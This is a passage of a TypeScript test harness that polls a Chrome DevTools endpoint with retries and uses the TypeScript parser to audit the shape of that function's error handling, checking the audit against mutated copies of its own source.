  // Defaults to the shipped DEBUGGER_TARGET_MS. Injected only by the synthetic
  // never-ready checks, which must not pay the production ceiling.
  deadlineMs?: number;
  // Receives the number of /json/list attempts made, on success or failure.
  onAttempts?: (attempts: number) => void;
};

function resolveDebuggerDeadlineMs(options: DebuggerTargetOptions) {
  return options.deadlineMs ?? DEBUGGER_TARGET_MS;
}

async function fetchDebuggerPageTarget(url: string, signal: AbortSignal, options: DebuggerTargetOptions = {}) {
  const controller = new AbortController();
  const startedAt = Date.now();
  let timedOut = false;
  let attempts = 0;
  const onAbort = () => controller.abort();
  signal.addEventListener("abort", onAbort, { once: true });
  const timer = setTimeout(() => {
    timedOut = true;
    controller.abort();
  }, resolveDebuggerDeadlineMs(options));
  // A rejection from this step carries the interval it governed and the
  // attempts it made, so a run that fails reports the same two numbers a run
  // that succeeds prints. Both are counters, so the message and the process
  // surface stay content-free.
  const expiredAt = () => new ProofTimeoutError("debugger_target", undefined, Date.now() - startedAt, attempts);
  try {
    // Chrome can publish DevToolsActivePort before its devtools listener
    // accepts connections, so a refused or reset connection here is transient.
    // Retry in small steps inside the deadline resolved above; a genuinely
    // unavailable endpoint still fails as debugger_target when it expires.
    for (;;) {
      attempts += 1;
      let unparseableBody = false;
      // This catch binds no error on purpose: only fetch and the body read can
      // throw here, neither makes a ProofTimeoutError, and the outer abort and
      // the deadline are decided from their own flags. A guard rethrowing a
      // ProofTimeoutError from this position could never fire.
      try {
        const response = await fetch(url, { signal: controller.signal });
        if (response.ok) {
          const targets = parseDebuggerTargets(await response.text());
          if (targets) {
            // A shaped list with no page target in it, the empty array
            // included, is Chrome before its first page registers. That is a
            // readiness state, so it retries inside the deadline like a
            // refused connection instead of ending the step.
            const page = targets.find((target) => target.type === "page");
            if (page) return page;
          } else {
            unparseableBody = true;
          }
        } else {
          await response.body?.cancel().catch(() => undefined);
        }
      } catch {
        if (signal.aborted) throw new ProofTimeoutError("browser_proof_overall");
        if (timedOut) throw expiredAt();
      }
      // An OK response that is not a target list is a decided answer, so the
      // step ends on it instead of refetching a body that will not change. It
      // is thrown outside the catch above so a transient socket error stays the
      // only thing that retries. The payload detail keeps a broken endpoint
      // distinguishable from a slow one at the process surface, and stays
      // content-free: the stage and the word payload, nothing from the body.
      if (unparseableBody) throw new ProofTimeoutError("debugger_target", "payload", Date.now() - startedAt, attempts);
      await debuggerRetryStep(DEBUGGER_TARGET_RETRY_MS, controller.signal);
      if (signal.aborted) throw new ProofTimeoutError("browser_proof_overall");
      if (timedOut) throw expiredAt();
    }
  } finally {
    clearTimeout(timer);
    signal.removeEventListener("abort", onAbort);
    options.onAttempts?.(attempts);
  }
}

function activeTimerCount() {
  return process.getActiveResourcesInfo().filter((resource) => resource === "Timeout").length;
}

// What this audit proves, and what it cannot.
//
// The catch inside fetchDebuggerPageTarget must bind no error and must carry no
// ProofTimeoutError guard: only fetch and the body read can throw there, neither
// makes a ProofTimeoutError, so a guard in that position would be dead code
// wearing the shape of a control. Earlier revisions asserted that shape against
// the text, with a naive comment strip bounded by a second, hand-rolled
// literal-aware strip. Both were approximations of a lexer, and the
// approximation leaked in both directions: an unescaped slash pair inside a
// regex literal opened a block comment for *both* strips at the same index, so
// they agreed, the byte bound held, and a re-bound catch carrying a live guard
// audited clean; while a string holding a line-comment or block-comment opener
// reddened the audit with no sabotage present at all.
//
// So this reads the real parser instead of imitating it. ts.createSourceFile is
// the front end tsc already runs over this file, so comments, strings, template
// literals and regex literals are lexed as what they are and no arrangement of
// them can move a count unless the code itself changed. The audit parses the
// whole proof file, finds fetchDebuggerPageTarget by name in the tree rather
// than by a text anchor, and counts syntax nodes inside it: catch clauses with
// and without a binding, ProofTimeoutError guards, the rejection callbacks the
// function hands to .catch and .then, and the one endless loop the retry lives
// in. A file that will not parse and a function that cannot be found are both
// red audits; neither can produce a green one.
//
// Counting catch clauses alone left the error bound somewhere else: a callback
// parameter. So a guard counts wherever it sits in this function, and every
// callback this function hands to a promise is followed to the body it names:
// the .catch and .finally argument, both .then arguments, and those three
// reached through an element access (p["catch"](h)) as well as a property
// access — whether the promise is the fetch's or a Promise.allSettled this
// function only waits on (REVIEW-89 N4). An inline function or arrow, its own
// parentheses included, is its own body; a bare identifier is resolved to the
// one function of that name in this file; and that body is counted too. A
// handler this file cannot resolve is refused rather than read: an unread
// handler cannot be shown to be guard-free, so it reds the audit. That refusal
// is a refusal, not a diagnosis, so the receipt names the spelling it refused
// in unresolvedHandlerForms — const-alias, method-reference, bind-result,
// comma-expression, call-result, shadowed-name, declaration-without-a-body,
// name-not-declared-in-this-file or other — because every one of them can red
// the audit with no defect present (REVIEW-89 N3). That refusal reaches every
// position scanned here, the .finally callback and the .then fulfilment
// argument included, and it does not wait for a guard: a cleanup callback that
// tests nothing at all reds the audit as soon as this file cannot read its
// body. That is the price of reading those two positions, and it is paid in the
// safe direction (REVIEW-98 F3).
//
// A guard counts when it is a binary test, a case clause or a call that decides
// the same thing: instanceof and the name string as before, plus
// === <Class>.prototype on either side, <expr>.constructor === <Class>,
// <Class>.prototype.isPrototypeOf(error), the
// Object.prototype.isPrototypeOf.call(<Class>.prototype, error) spelling of it,
// and <Class>[Symbol.hasInstance](error), which is the method instanceof
// compiles to and runs (REVIEW-98 F1). The class may be reached through an
// aliased import or a local alias, resolved to a fixpoint. Every operand is
// read through its parentheses, so instanceof (<Class>) and
// === (<Class>).prototype count too (REVIEW-89 N1). A call form is read as a
// guard from the class it names and not from what it is handed: this function
// has no single "the caught error" to compare an argument against — the error
// can be a catch binding, a callback parameter, a settled result's reason or an
// alias of any of them — so requiring the argument to name it would be a
// binding analysis this audit does not do, and would reopen the escape the call
// forms close. What a call form must have is an argument at all: an
// isPrototypeOf with none tests nothing and is not a guard (REVIEW-98 F6).
//
// The retry loop may be a for with no condition, a while (true) or a
// do { } while (true). They are one loop written three ways, and a maintainer
// or a linter rewriting one into another is not a defect, so all three are
// accepted; what stays load-bearing is that there is exactly one endless loop
// and exactly one bindless try/catch inside it. The receipt names every loop
// form found in the function, so a red over the loop count reports the shape it
// found instead of leaving the reader to infer it. loopForms is asserted
// against the loops the audit decides on: the loops describeLoops named endless
// must be the same nodes isEndlessLoop found, in the same order — not merely
// the same number of them. Counting alone could not fail, because one endless
// loop yields one endless form by construction, so the count asserted nothing a
// reader could act on (REVIEW-98 F5); comparing the nodes can fail, and it
// fails exactly when the two walks drift apart, which is the future edit this
// guards against. No planted source shape can make it fire — only an edit to
// describeLoops or isEndlessLoop can — and when it does the receipt's
// diagnostic says which two walks disagreed. Asserting *which* form is there
// would re-introduce the false red the three-form acceptance removed
// (REVIEW-89 §9.10).
//
// What it cannot see: a ProofTimeoutError re-raised by a function this one
// invokes rather than hands over as a callback; a handler named by anything but
// an identifier this file declares a function with a body for, which is refused
// rather than read; a class or a handler that lives in another file; a guard
// whose class operand is computed rather than named (instanceof (0, <Class>),
// which does not compile here anyway); a guard whose method is computed from
// something this file cannot read as a literal, which is where the call forms
// stop — <Class>[Symbol.hasInstance](error) and the
// <Class>[Symbol["hasInstance"]](error) spelling of it are read, but a symbol
// or a method name stashed in a variable first is not, and neither is
// <Class>.prototype["isPrototypeOf"](error) or
// Function.prototype[Symbol.hasInstance].call(<Class>, error), all of which
// compile here; and any shape assembled at run time through eval or
// new Function. No behavioural check backs the audit up for those: the guard
// it exists to refuse is dead by construction, so it changes nothing a
// behavioural check could observe. This is a shape check on one function body
// and claims nothing past it.
const FETCH_TARGET_NAME = "fetchDebuggerPageTarget";
const TIMEOUT_ERROR_NAME = "ProofTimeoutError";

function collectNodes<T extends ts.Node>(root: ts.Node, match: (node: ts.Node) => node is T) {
  const found: T[] = [];
  const visit = (node: ts.Node) => {
    if (match(node)) found.push(node);
    ts.forEachChild(node, visit);
  };
  ts.forEachChild(root, visit);
  return found;
}

function isLoop(node: ts.Node): node is ts.IterationStatement {
  return ts.isForStatement(node) || ts.isWhileStatement(node) || ts.isDoStatement(node)
    || ts.isForOfStatement(node) || ts.isForInStatement(node);
}

// for (;;), while (true) and do { } while (true) are the same endless loop.
function isEndlessLoop(node: ts.Node): node is ts.IterationStatement {
  if (ts.isForStatement(node)) return node.condition === undefined;
  if (ts.isWhileStatement(node) || ts.isDoStatement(node)) {
    return node.expression.kind === ts.SyntaxKind.TrueKeyword;
  }
  return false;
}

// Parentheses carry no meaning of their own, so every operand below is read
// through them: instanceof (<Class>) is instanceof <Class>. ts.skipParentheses
// does exactly this but is not on the public TypeScript API surface, so this is
// the same walk written against the types this build checks.
function skipParentheses(expression: ts.Expression): ts.Expression {
  let current = expression;
  while (ts.isParenthesizedExpression(current)) current = current.expression;
  return current;
}

const ENDLESS_LOOP_FORMS = new Set(["for(;;)", "while(true)", "do-while(true)"]);

function loopForm(loop: ts.IterationStatement) {
  if (ts.isForOfStatement(loop)) return "for-of";
  if (ts.isForInStatement(loop)) return "for-in";
  const endless = isEndlessLoop(loop);
  if (ts.isForStatement(loop)) return endless ? "for(;;)" : "for(condition)";
  if (ts.isWhileStatement(loop)) return endless ? "while(true)" : "while(condition)";
  return endless ? "do-while(true)" : "do-while(condition)";
}

// Named for the receipt, and kept beside the node the name came from, so the
// audit can hold this walk against isEndlessLoop's by node instead of by count.
function describeLoops(root: ts.Node) {
  return collectNodes(root, isLoop).map((loop) => ({ form: loopForm(loop), loop }));
}

// Every name this file can use to reach the class: the class itself, an import
// specifier renaming it, and a binding assigned from one of those. Resolved to
// a fixpoint so a chain of renames still lands on the same class.
function timeoutErrorNames(sourceFile: ts.SourceFile) {
  const names = new Set([TIMEOUT_ERROR_NAME]);
  const specifiers = collectNodes(sourceFile, ts.isImportSpecifier);
  const rebindings = collectNodes(sourceFile, (node): node is ts.VariableDeclaration =>
    ts.isVariableDeclaration(node)
      && ts.isIdentifier(node.name)
      && node.initializer !== undefined
      && ts.isIdentifier(node.initializer));
  let grew = true;
  while (grew) {
    grew = false;
    const add = (name: string) => {
      if (!names.has(name)) {
        names.add(name);
        grew = true;
      }
    };
    for (const specifier of specifiers) {
      if (names.has((specifier.propertyName ?? specifier.name).text)) add(specifier.name.text);
    }
    for (const rebinding of rebindings) {
      if (names.has((rebinding.initializer as ts.Identifier).text)) add((rebinding.name as ts.Identifier).text);
    }
  }
  return names;
}

type TimeoutGuard = ts.BinaryExpression | ts.CaseClause | ts.CallExpression;

// instanceof ProofTimeoutError, name === "ProofTimeoutError", the same name
// reached through a switch, and the three identity tests that never spell the
// class — a prototype comparison, a constructor comparison and an isPrototypeOf
// call — all count as a guard: each one lets the handler decide it is holding a
// timeout and rethrow it. Any name resolved to the class above stands in for
// the class here, and every operand is read through its parentheses.
function timeoutGuardMatcher(names: Set<string>) {
  const namesTheClass = (operand: ts.Expression) => {
    const expression = skipParentheses(operand);
    return (ts.isIdentifier(expression) && names.has(expression.text))
      || (ts.isPropertyAccessExpression(expression) && names.has(expression.name.text));
  };
  const namesTheError = (operand: ts.Expression) => {
    const expression = skipParentheses(operand);
    return ts.isStringLiteralLike(expression) && expression.text === TIMEOUT_ERROR_NAME;
  };
  const readsThePrototype = (operand: ts.Expression) => {
    const expression = skipParentheses(operand);
    return ts.isPropertyAccessExpression(expression)
      && expression.name.text === "prototype"
      && namesTheClass(expression.expression);
  };
  const readsAConstructor = (operand: ts.Expression) => {
    const expression = skipParentheses(operand);
    return ts.isPropertyAccessExpression(expression) && expression.name.text === "constructor";
  };
  // Symbol.hasInstance, written as a property access or with the property name
  // as a literal. Both spellings compile under this tsconfig.
  const namesHasInstance = (operand: ts.Expression) => {
    const expression = skipParentheses(operand);
    const onSymbol = (host: ts.Expression) => {
      const target = skipParentheses(host);
      return ts.isIdentifier(target) && target.text === "Symbol";
    };
    if (ts.isPropertyAccessExpression(expression)) {
      return expression.name.text === "hasInstance" && onSymbol(expression.expression);
    }
    if (!ts.isElementAccessExpression(expression)) return false;
    const property = skipParentheses(expression.argumentExpression);
    return ts.isStringLiteralLike(property) && property.text === "hasInstance" && onSymbol(expression.expression);
  };
  // <Class>.prototype.isPrototypeOf(error), the same test spelled through
  // Object.prototype.isPrototypeOf.call/apply(<Class>.prototype, error), and
  // <Class>[Symbol.hasInstance](error), which is the method instanceof itself
  // calls. All three decide "am I holding one of these" without ever writing
  // instanceof, which is why a call is a guard shape here and not only a binary
  // expression. Each must be handed something — a test with nothing to test is
  // not a test — and none of them reads what it was handed (REVIEW-98 F1, F6).
  const testsThePrototypeByCall = (node: ts.CallExpression) => {
    const callee = skipParentheses(node.expression);
    if (ts.isElementAccessExpression(callee)) {
      return namesHasInstance(callee.argumentExpression)
        && node.arguments.length > 0
        && namesTheClass(callee.expression);
    }
    if (!ts.isPropertyAccessExpression(callee)) return false;
    if (callee.name.text === "isPrototypeOf") {
      return node.arguments.length > 0 && readsThePrototype(callee.expression);
    }
    if (callee.name.text !== "call" && callee.name.text !== "apply") return false;
    const method = skipParentheses(callee.expression);
    return ts.isPropertyAccessExpression(method)
      && method.name.text === "isPrototypeOf"
      && node.arguments.length > 0
      && readsThePrototype(node.arguments[0]);
  };
  return (node: ts.Node): node is TimeoutGuard => {
    if (ts.isCaseClause(node)) return namesTheError(node.expression);
    if (ts.isCallExpression(node)) return testsThePrototypeByCall(node);
    if (!ts.isBinaryExpression(node)) return false;
    const operator = node.operatorToken.kind;
    if (operator === ts.SyntaxKind.InstanceOfKeyword) return namesTheClass(node.right);
    const isEquality = operator === ts.SyntaxKind.EqualsEqualsEqualsToken
      || operator === ts.SyntaxKind.EqualsEqualsToken
      || operator === ts.SyntaxKind.ExclamationEqualsEqualsToken
      || operator === ts.SyntaxKind.ExclamationEqualsToken;
    if (!isEquality) return false;
    if (namesTheError(node.left) || namesTheError(node.right)) return true;
    if (readsThePrototype(node.left) || readsThePrototype(node.right)) return true;
    return (readsAConstructor(node.left) && namesTheClass(node.right))
      || (readsAConstructor(node.right) && namesTheClass(node.left));
  };
}

// By name in the tree, both as a declaration and as a function assigned to that
// name, so moving the function or renaming around it reds the audit instead of
// silently auditing nothing. One name can only resolve to one function here:
// two is a shadow the audit refuses rather than picks between. A declaration
// with no body — an ambient declare function, or an overload signature — is not
// a function this file can read, so it is not a match: a handler that names one
// is refused rather than read as guard-free, which is what a body-less
// "function" made it before (REVIEW-98 F4).
function findFunctionsNamed(sourceFile: ts.SourceFile, name: string): ts.Node[] {
  const declared = collectNodes(sourceFile, (node): node is ts.FunctionDeclaration =>
    ts.isFunctionDeclaration(node) && node.name?.text === name && node.body !== undefined);
  const assigned = collectNodes(sourceFile, (node): node is ts.VariableDeclaration =>
    ts.isVariableDeclaration(node)
      && ts.isIdentifier(node.name)
      && node.name.text === name
      && node.initializer !== undefined
      && (ts.isFunctionExpression(node.initializer) || ts.isArrowFunction(node.initializer)));
  return [...declared, ...assigned.map((declaration) => declaration.initializer as ts.Node)];
}

function findFetchFunction(sourceFile: ts.SourceFile): ts.Node[] {
  return findFunctionsNamed(sourceFile, FETCH_TARGET_NAME);
}

// The three promise methods that take a callback this function never calls
// itself. A guard can rethrow from any of them: .catch and .finally take one,
// .then takes a fulfilment handler and a rejection handler, and a fulfilment
// handler over Promise.allSettled sees every rejection the settle hid.
const HANDLER_METHODS = new Set(["catch", "then", "finally"]);

// p.catch(h) and p["catch"](h) are the same call. A computed name this file
// cannot read as a literal is not a handler method here.
function handlerMethodName(call: ts.CallExpression) {
  const callee = skipParentheses(call.expression);
  if (ts.isPropertyAccessExpression(callee)) return callee.name.text;
  if (!ts.isElementAccessExpression(callee)) return undefined;
  const name = skipParentheses(callee.argumentExpression);
  return ts.isStringLiteralLike(name) ? name.text : undefined;
}

// undefined, null and void 0 in a handler position are the absence of a
// handler — .then(undefined, h) is a .catch — not one this file failed to read.
function isAbsentHandler(argument: ts.Expression) {
  const expression = skipParentheses(argument);
  return (ts.isIdentifier(expression) && expression.text === "undefined")
    || expression.kind === ts.SyntaxKind.NullKeyword
    || ts.isVoidExpression(expression);
}

// What a refused handler was written as, so the receipt names the spelling
// instead of only the refusal.
function describeHandlerForm(
  argument: ts.Expression,
  isConstAlias: (name: string) => boolean,
  isDeclaredWithoutABody: (name: string) => boolean,
  resolved: number,
) {
  const expression = skipParentheses(argument);
  if (ts.isPropertyAccessExpression(expression) || ts.isElementAccessExpression(expression)) return "method-reference";
  if (ts.isCallExpression(expression)) {
    const callee = skipParentheses(expression.expression);
    return ts.isPropertyAccessExpression(callee) && callee.name.text === "bind" ? "bind-result" : "call-result";
  }
  if (ts.isBinaryExpression(expression) && expression.operatorToken.kind === ts.SyntaxKind.CommaToken) return "comma-expression";
  if (!ts.isIdentifier(expression)) return "other";
  if (resolved > 1) return "shadowed-name";
  // A name this file declares only as a signature is declared here and still
  // unreadable, so the receipt says that rather than "not declared in this
  // file", which would be false.
  if (isDeclaredWithoutABody(expression.text)) return "declaration-without-a-body";
  return isConstAlias(expression.text) ? "const-alias" : "name-not-declared-in-this-file";
}

// The callbacks the audited function hands to a promise, by the methods above.
// An inline function or arrow is its own body; a bare identifier is resolved to
// the one function of that name in this file. Anything else — an imported
// handler, a shadowed name, a const alias, a method reference, a .bind() result,
// a handler built from an expression — is unresolved, and an unresolved handler
// reds the audit because its body cannot be read here at all.
function scanRejectionHandlers(root: ts.Node, sourceFile: ts.SourceFile, isTimeoutGuard: (node: ts.Node) => node is TimeoutGuard) {
  const handlers: ts.Expression[] = [];
  for (const call of collectNodes(root, ts.isCallExpression)) {
    const method = handlerMethodName(call);
    if (method === undefined || !HANDLER_METHODS.has(method)) continue;
    const taken = method === "then" ? call.arguments.slice(0, 2) : call.arguments.slice(0, 1);
    handlers.push(...taken.filter((argument) => !isAbsentHandler(argument)));
  }
  // Built only when a handler is refused, so an audit with nothing to name does
  // not pay for another walk of the file.
  let aliasNames: Set<string> | undefined;
  const isConstAlias = (name: string) => {
    aliasNames ??= new Set(collectNodes(sourceFile, (node): node is ts.VariableDeclaration =>
      ts.isVariableDeclaration(node)
        && ts.isIdentifier(node.name)
        && node.initializer !== undefined
        && ts.isIdentifier(node.initializer))
      .map((declaration) => (declaration.name as ts.Identifier).text));
    return aliasNames.has(name);
  };
  // The same lazy build for the other thing a refused name can be: a function
  // this file declares without a body.
  let bodilessNames: Set<string> | undefined;
  const isDeclaredWithoutABody = (name: string) => {
    bodilessNames ??= new Set(collectNodes(sourceFile, (node): node is ts.FunctionDeclaration =>
      ts.isFunctionDeclaration(node) && node.body === undefined)
      .flatMap((declaration) => (declaration.name ? [declaration.name.text] : [])));
    return bodilessNames.has(name);
  };
  let guards = 0;
  let unresolved = 0;
  const forms = new Set<string>();
  for (const handler of handlers) {
    const expression = skipParentheses(handler);
    let body: ts.Node | undefined;
    let resolved = 0;
    if (ts.isFunctionExpression(expression) || ts.isArrowFunction(expression)) {
      body = expression;
    } else if (ts.isIdentifier(expression)) {
      const matches = findFunctionsNamed(sourceFile, expression.text);
      resolved = matches.length;
      body = matches.length === 1 ? matches[0] : undefined;
    }
    if (!body) {
      unresolved += 1;
      forms.add(describeHandlerForm(handler, isConstAlias, isDeclaredWithoutABody, resolved));
      continue;
    }
    if (collectNodes(body, isTimeoutGuard).length > 0) guards += 1;
  }
  return { handlers: handlers.length, guards, unresolved, forms: [...forms].sort() };
}

function auditFetchSource(fileText: string) {
  const red = {
    method: "typescript-ast" as const,
    parsed: false,
    found: 0,
    catchBindings: 0,
    bindlessCatches: 0,
    timeoutGuards: 0,
    rejectionHandlers: 0,
    callbackGuards: 0,
    unresolvedHandlers: 0,
    unresolvedHandlerForms: [] as string[],
    forEver: 0,
    loopForms: [] as string[],
    retryLoopBindless: false,
    diagnostic: "",
    clean: false,
  };
  const sourceFile = ts.createSourceFile(scriptPath, fileText, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  // parseDiagnostics is the parser's own error list. It is not on the public
  // SourceFile type, so a TypeScript that stopped publishing it must red this
  // audit rather than silently report a file with no errors.
  const diagnostics = (sourceFile as unknown as { parseDiagnostics?: unknown }).parseDiagnostics;
  if (!Array.isArray(diagnostics)) {
    return { ...red, diagnostic: "parse diagnostics unavailable from this TypeScript build" };
  }
  if (diagnostics.length > 0) {
    const first = diagnostics[0] as ts.DiagnosticWithLocation;
    return { ...red, diagnostic: `TS${first.code} at ${first.start}: ${ts.flattenDiagnosticMessageText(first.messageText, " ")}` };
  }
  const matches = findFetchFunction(sourceFile);
  if (matches.length !== 1) {
    return { ...red, parsed: true, found: matches.length, diagnostic: `expected exactly one ${FETCH_TARGET_NAME}, found ${matches.length}` };
  }
  const isTimeoutGuard = timeoutGuardMatcher(timeoutErrorNames(sourceFile));
  const catchClauses = collectNodes(matches[0], ts.isCatchClause);
  const catchBindings = catchClauses.filter((clause) => clause.variableDeclaration !== undefined).length;
  const bindlessCatches = catchClauses.length - catchBindings;
  const timeoutGuards = collectNodes(matches[0], isTimeoutGuard).length;
  const rejection = scanRejectionHandlers(matches[0], sourceFile, isTimeoutGuard);
  const endless = collectNodes(matches[0], isEndlessLoop);
  const described = describeLoops(matches[0]);
  const loopForms = described.map((entry) => entry.form);
  // The loops the receipt calls endless must be the loops the audit decided on:
  // the same nodes, in the same order. Only an edit to describeLoops or
  // isEndlessLoop can break this, which is the drift it exists to catch.
  const namedEndless = described.filter((entry) => ENDLESS_LOOP_FORMS.has(entry.form));
  const loopWalksAgree = namedEndless.length === endless.length
    && namedEndless.every((entry, index) => entry.loop === endless[index]);
  const retryTries = endless.length === 1 ? collectNodes(endless[0].statement, ts.isTryStatement) : [];
  const retryLoopBindless = retryTries.length === 1
    && retryTries[0].catchClause !== undefined
    && retryTries[0].catchClause.variableDeclaration === undefined;
  return {
    method: "typescript-ast" as const,
    parsed: true,
    found: 1,
    catchBindings,
    bindlessCatches,
    timeoutGuards,
    rejectionHandlers: rejection.handlers,
    callbackGuards: rejection.guards,
    unresolvedHandlers: rejection.unresolved,
    unresolvedHandlerForms: rejection.forms,
    forEver: endless.length,
    loopForms,
    retryLoopBindless,
    diagnostic: loopWalksAgree ? "" : "describeLoops and isEndlessLoop disagree about which loops are endless",
    clean: catchBindings === 0
      && bindlessCatches === 1
      && timeoutGuards === 0
      && rejection.guards === 0
      && rejection.unresolved === 0
      && endless.length === 1
      && loopWalksAgree
      && retryLoopBindless,
  };
}

type SourceEdit = { start: number; end: number; text: string };
type FetchSourceAnchors = {
  beforeFunction: number;
  beforeTry: number;
  catchHeadStart: number;
  catchHeadEnd: number;
  afterTry: number;
  loopHeadStart: number;
  loopBodyStart: number;
  loopBodyEnd: number;
  loopEnd: number;
  fetchCallEnd: number;
  bodyCatchArgStart: number;
  bodyCatchArgEnd: number;
};

// Probe sources are spliced at the parser's own node offsets. The probes this
// replaces mutated whichever "} catch {" String.replace found first, so a
// literal spelling that text earlier in the function would have retargeted them
// silently; an offset taken from the catch clause itself cannot be retargeted.
// The same holds for the rest: the loop header, the fetch call and the handler
// the body read already hands to .catch are all located in the tree, so a probe
// that rewrites one of them rewrites the node it named or nothing at all.
//
// The anchors also require exactly one fetch( call and exactly one
// single-argument .catch( call inside the retry try, because the probes splice
// at those two nodes. A benign refactor of the shipped function that adds a
// second .catch( in the try, or moves fetch into a local helper, therefore
// takes the anchor-miss path (REVIEW-89 N2). Keeping the requirement strict is
// the choice here: loosening it would mean guessing which of two .catch calls
// is the body read's, which is the retargeting the parser offsets exist to
// make impossible. So the refusal stays, and instead it says what it wanted —
// every miss carries the requirement it failed and the number it measured, and
// the receipt already carries the primary audit beside it, so a reader tells a
// benign refactor (audit clean, one anchor requirement short) from a sabotage
// (audit not clean) from the receipt alone — as far as this audit can see. The
// reading is only ever as good as the audit beside it: a sabotage carrying a
// guard shape this file cannot read prints the clean audit a benign refactor
// prints, and the two receipts are then identical (REVIEW-98 F2). The run exits
// 1 on both, so nothing ships either way; what the reader cannot do is tell
// from the receipt alone which of the two it was holding.
type AnchorMiss = { requirement: string; measured: Record<string, number> };

function isAnchorMiss(located: FetchSourceAnchors | AnchorMiss): located is AnchorMiss {
  return "requirement" in located;
}

function fetchSourceAnchors(fileText: string): FetchSourceAnchors | AnchorMiss {
  const sourceFile = ts.createSourceFile(scriptPath, fileText, ts.ScriptTarget.Latest, true, ts.ScriptKind.TS);
  const matches = findFetchFunction(sourceFile);
  if (matches.length !== 1) {
    return { requirement: `exactly one ${FETCH_TARGET_NAME} in the file`, measured: { functions: matches.length } };
  }
  const endless = collectNodes(matches[0], isEndlessLoop);
  if (endless.length !== 1) {
    return { requirement: "exactly one endless loop in the function", measured: { endlessLoops: endless.length } };
  }
  const tries = collectNodes(endless[0].statement, ts.isTryStatement);
  if (tries.length !== 1) {
    return { requirement: "exactly one try in the endless loop", measured: { tries: tries.length } };
  }
  const clause = tries[0].catchClause;
  if (!clause || clause.variableDeclaration) {
    return {
      requirement: "a bindless catch on the retry try",
      measured: { catchClauses: clause ? 1 : 0, catchBindings: clause?.variableDeclaration ? 1 : 0 },
    };
  }
  const calls = collectNodes(tries[0].tryBlock, ts.isCallExpression);
  const fetchCalls = calls.filter((call) => ts.isIdentifier(call.expression) && call.expression.text === "fetch");
  const bodyCatches = calls.filter((call) =>
    ts.isPropertyAccessExpression(call.expression) && call.expression.name.text === "catch");
  if (fetchCalls.length !== 1) {
    return { requirement: "exactly one fetch( call in the retry try", measured: { fetchCalls: fetchCalls.length } };
  }
  if (bodyCatches.length !== 1 || bodyCatches[0].arguments.length !== 1) {
    return {
      requirement: "exactly one single-argument .catch( call in the retry try",
      measured: { catchCalls: bodyCatches.length, catchArguments: bodyCatches[0]?.arguments.length ?? 0 },
    };
  }
  return {
    beforeFunction: matches[0].getStart(sourceFile),
    beforeTry: tries[0].getStart(sourceFile),
    catchHeadStart: tries[0].tryBlock.getEnd() - 1,
    catchHeadEnd: clause.block.getStart(sourceFile) + 1,
    afterTry: tries[0].getEnd(),
    loopHeadStart: endless[0].getStart(sourceFile),
    loopBodyStart: endless[0].statement.getStart(sourceFile),
    loopBodyEnd: endless[0].statement.getEnd(),
    loopEnd: endless[0].getEnd(),
    fetchCallEnd: fetchCalls[0].getEnd(),
    bodyCatchArgStart: bodyCatches[0].arguments[0].getStart(sourceFile),
    bodyCatchArgEnd: bodyCatches[0].arguments[0].getEnd(),
  };
}

// The audit itself, driven over mutated copies of this file: every formatting,
// comment and literal shape that must stay green, every real regression that
// must stay red, and the full cross-product of the literal shapes that defeated
// the lexical strip against the two sabotages they were used to hide.
function proveFetchSourceAudit(proofSource: string) {
  const checkName = "debugger_target_source_audit_ignores_comments_and_spacing_but_still_catches_a_binding_or_a_guard";
  const located = fetchSourceAnchors(proofSource);
  if (isAnchorMiss(located)) {
    // The anchors go missing when a sabotage lands and when a benign refactor
    // moves one of the nodes they name, so the receipt carries both halves of
    // that question: which anchor requirement failed and what it measured, and
    // the primary audit of the same source. A clean audit beside a missed
    // anchor is a refactor as far as this audit can see; a red one is a
    // sabotage.
    check(checkName, false, JSON.stringify({
      method: "typescript-ast",
      error: "retry_catch_anchors_not_found",
      requirement: located.requirement,
      measured: located.measured,
      probes: 0,
      audit: auditFetchSource(proofSource),
    }));
    return;
  }
  const anchors = located;
  const applyEdits = (edits: SourceEdit[]) => [...edits]
    .sort((left, right) => right.start - left.start)
    .reduce((text, edit) => text.slice(0, edit.start) + edit.text + text.slice(edit.end), proofSource);
  const before = (text: string): SourceEdit => ({ start: anchors.beforeTry, end: anchors.beforeTry, text });
  const head = (text: string): SourceEdit => ({ start: anchors.catchHeadStart, end: anchors.catchHeadEnd, text });
  const body = (text: string): SourceEdit => ({ start: anchors.catchHeadEnd, end: anchors.catchHeadEnd, text });
  const after = (text: string): SourceEdit => ({ start: anchors.afterTry, end: anchors.afterTry, text });
  const outside = (text: string): SourceEdit => ({ start: anchors.beforeFunction, end: anchors.beforeFunction, text });
  const onFetch = (text: string): SourceEdit => ({ start: anchors.fetchCallEnd, end: anchors.fetchCallEnd, text });
  const bodyHandler = (text: string): SourceEdit => ({ start: anchors.bodyCatchArgStart, end: anchors.bodyCatchArgEnd, text });
  const beforeLoop = (text: string): SourceEdit => ({ start: anchors.loopHeadStart, end: anchors.loopHeadStart, text });
  // A loop probe replaces the whole statement around the loop body: the header
  // before it and, for a do-while, the trailing while after it. Rewriting only
  // the header would leave the shipped loop's own tail behind and count a
  // second loop, so the probe set said the right thing about the three
  // accepted loop forms only while this file happened to ship the for one
  // (REVIEW-89 §3). For a for or a while the tail is empty and this is the
  // header edit it was before.
  const loopAs = (head: string, tail: string): SourceEdit[] => [
    { start: anchors.loopHeadStart, end: anchors.loopBodyStart, text: head },
    { start: anchors.loopBodyEnd, end: anchors.loopEnd, text: tail },
  ];
  const guardStatement = "\n        if (error instanceof ProofTimeoutError) throw error;";
  const rethrowHelper = "function rethrowIfTimeout(error: unknown): never {\n  if (error instanceof ProofTimeoutError) throw error;\n  throw error as Error;\n}\n";
  const silentHelper = "function ignoreRejection(error: unknown): void {\n  void error;\n}\n";
  const aliasHelper = "const boundRethrow = rethrowIfTimeout;\n";
  const holderHelper = "const rejectionGuards = { rethrow(error: unknown): never { if (error instanceof ProofTimeoutError) throw error; throw error as Error } };\n";
  const settledHelper = "function inspectSettled(results: PromiseSettledResult<unknown>[]): void {\n  for (const result of results) {\n    if (result.status === \"rejected\" && result.reason instanceof ProofTimeoutError) throw result.reason;\n  }\n}\n";
  const unescapedRegexOpener = "const slashy = /[/*]/;\n      if (slashy.test(url)) attempts += 0;\n      ";
  const named = [
    { name: "unmodified", source: proofSource, expected: true },
    { name: "bindless_catch_without_spaces", source: applyEdits([head("}catch{")]), expected: true },
    { name: "bindless_catch_with_extra_space", source: applyEdits([head("} catch  {")]), expected: true },
    { name: "bindless_catch_across_a_newline", source: applyEdits([head("} catch\n    {")]), expected: true },
